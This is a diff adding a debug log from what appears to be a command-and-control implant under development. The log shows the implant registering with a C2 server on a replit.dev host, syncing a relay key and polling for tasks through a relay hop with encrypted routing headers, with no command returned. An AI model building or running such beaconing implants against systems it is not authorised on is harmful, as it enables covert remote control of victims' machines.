@@ -1,0 +1,46 @@
+DEBUG: Registration successful. Implant now registered with ID: gdI71mS4
+[DEBUG] 🔑 REGISTRATION FIX: Synced g_relayClientKey from listener
+[DEBUG] 🔑 REGISTRATION FIX: Key length: 16
+[DEBUG] 🌐 HTTP Handler: Direct C2 registration completed
+[DEBUG] 🌐 HTTP Handler: Implant registered with C2
+[DEBUG] 🌐 HTTP Handler: Starting polling loop with 10s interval
+
+
+
+┌─ 🌐 HTTP HANDLER CYCLE #1
+├─ C2: https://3b4f8527-9f97-4987-ba14-6d09429dcb8f-00-3djvoscwrifyv.kirk.replit.dev:8080 │ Sleep: 10s │ HTTP Relay System
+└─────────────────────────────────────────────────────────
+
+[DEBUG] 🌐 HTTP Handler: Starting polling cycle
+[DEBUG] 🌐 HTTP Handler: Polling C2 for commands (check-in)
+DEBUG: getQueuedCommand() called for implant ID: gdI71mS4
+DEBUG: getQueuedCommand() request target: /task
+DEBUG: getQueuedCommand() full URL will be: https://3b4f8527-9f97-4987-ba14-6d09429dcb8f-00-3djvoscwrifyv.kirk.replit.dev/task
+DEBUG: doRequest() - Using httpclient for relay
+DEBUG: doRequest() - listenerType: HTTP
+DEBUG: doRequest() - path: /task
+DEBUG: Using first relay hop as target: 192.168.0.5:9999
+DEBUG: doRequest() - target URL: http://192.168.0.5:9999/task
+DEBUG: Encrypted hop chain: 192.168.0.5:9999 -> ICshMiwoJzYpNC4+PD8+OQ==
+DEBUG: Added X-Next-Hop header for relay chain: 192.168.0.5:9999
+DEBUG: doRequest() - About to request()
+DEBUG: doRequest() - request() completed
+DEBUG: doRequest() - Response code: 200
+DEBUG: getQueuedCommand() response code: 200
+DEBUG: getQueuedCommand() response body: {"status":"OK"}
+
+DEBUG: getQueuedCommand() attempting to parse response...
+DEBUG: getQueuedCommand() response body for parsing: {"status":"OK"}
+
+DEBUG: getQueuedCommand() parsed JSON keys: @["status"]
+DEBUG: getQueuedCommand() no 't' key found - no commands available
+DEBUG: getQueuedCommand() response JSON: {"status":"OK"}
+DEBUG: getQueuedCommand() final result - GUID:
+DEBUG: getQueuedCommand() final result - Command:
+DEBUG: getQueuedCommand() final result - Args: @[]
+[DEBUG] 🌐 HTTP Handler: Sleeping for 10000ms (base: 10000ms, jitter: 0ms)
+[DEBUG] 🌐 HTTP Handler: Woke up from sleep, continuing loop
+
+┌─ 🌐 END HTTP HANDLER CYCLE
+├─ 💤 Slept for 10000ms - continuing loop
+└─────────────────────────────────────────────────────────
